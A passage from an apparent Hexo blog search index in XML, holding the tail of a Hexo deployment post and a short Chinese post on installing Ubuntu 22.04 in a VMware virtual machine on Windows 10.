class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deb </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机安装ubuntu22.04</title>
      <link href="/2024/10/08/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vmware/"/>
      <url>/2024/10/08/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vmware/</url>
      
        <content type="html"><![CDATA[<h4 id="win10下-虚拟机安装ubuntu22-04"><a href="#win10下-虚拟机安装ubuntu22-04" class="headerlink" title="win10下 虚拟机安装ubuntu22.04"></a>win10下 虚拟机安装ubuntu22.04</h4> <span id="more"></span><p>下载vmware<a href="softwareupdate.vmware.com/cds/vmw-desktop/ws">下载</a></p><ul><li>打开vm17安装包安装</li><li>选择个人版，添加虚拟机，选自定义，选择ubuntu.....iso</li><li>由于vm强制简易安装 ，创建完成后要先退出安装，再安装以便设置中文</li></ul><h3 id="安装完成，菜单里-虚拟机-拍摄快照"><a href="#安装完成，菜单里-虚拟机-拍摄快照" class="headerlink" title="安装完成，菜单里-虚拟机-拍摄快照"></a>安装完成，菜单里-虚拟机-拍摄快照</h3>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
